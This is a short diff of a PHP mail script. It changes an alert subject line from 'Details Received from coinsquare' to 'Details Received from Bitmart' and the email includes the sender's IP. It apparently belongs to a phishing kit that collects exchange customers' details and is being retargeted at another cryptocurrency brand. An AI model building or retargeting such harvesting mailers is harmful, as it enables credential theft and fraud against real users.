@@ -22,7 +22,7 @@ require 'PHPMailer/class.phpmailer.php';
                                         <p>IP : ' . @$ip . '</p>
                                         </body>
                                 </html>';
-    $subject = 'Alert - '.$brandName.' Details Received from coinsquare';
+    $subject = 'Alert - '.$brandName.' Details Received from Bitmart';
  
 
 $message = $customerEmailer;
